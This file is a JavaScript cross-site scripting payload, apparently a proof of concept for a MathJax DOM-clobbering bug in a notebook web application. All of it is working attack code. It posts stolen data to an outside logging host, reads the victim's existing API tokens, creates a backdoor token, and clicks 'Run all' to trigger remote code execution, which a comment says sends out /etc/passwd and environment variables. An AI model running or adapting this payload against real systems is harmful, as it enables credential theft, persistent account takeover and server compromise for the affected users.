(async function() {
    const EXFIL = 'https://poc.heli9.com/jet/log.php';
    
    // Exfiltrate data to attacker server
    function exfil(type, data) {
        const payload = btoa(JSON.stringify({
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            domain: document.domain
        }));
        
        fetch(EXFIL + '?type=' + encodeURIComponent(type), {
            method: 'POST',
            mode: 'no-cors',
            body: payload
        }).catch(() => {});
    }
    
    // Log start
    exfil('xss_executed', {
        message: 'MathJax DOM Clobbering XSS triggered',
        domain: document.domain,
        url: location.href
    });
    
    // ========== IMPACT 1: STEAL EXISTING API TOKENS ==========
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/list', {
            credentials: 'include'
        });
        if (resp.ok) {
            const tokens = await resp.json();
            exfil('stolen_existing_tokens', tokens);
        }
    } catch(e) {}
    
    // ========== IMPACT 2: CREATE BACKDOOR API TOKEN ==========
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/create', {
            method: 'POST',
            credentials: 'include'
        });
        if (resp.ok) {
            const newToken = await resp.json();
            exfil('backdoor_token_created', newToken);
        }
    } catch(e) {}
    
    // ========== IMPACT 3: TRIGGER RCE VIA "RUN ALL" ==========
    // This executes the Python cell which exfiltrates /etc/passwd and env vars
    
    setTimeout(() => {
        // Find and click Run All button
        const selectors = [
            '[title*="Run all"]',
            '[aria-label*="Run all"]',
            'button[data-test="run-all"]',
            '[data-action="runAll"]'
        ];
        
        for (const sel of selectors) {
            const btn = document.querySelector(sel);
            if (btn) {
                btn.click();
                exfil('rce_triggered', { method: 'button_click', selector: sel });
                return;
            }
        }
        
        // Fallback: search menu items
        const menuItems = document.querySelectorAll('.dl-menu-item, [role="menuitem"]');
        for (const item of menuItems) {
            if (item.textContent && item.textContent.toLowerCase().includes('run all')) {
                item.click();
                exfil('rce_triggered', { method: 'menu_click' });
                return;
            }
        }
        
        exfil('rce_trigger_failed', { message: 'Run All button not found' });
        
    }, 1500);
    
    exfil('xss_complete', 'Exploitation complete');
    
})();
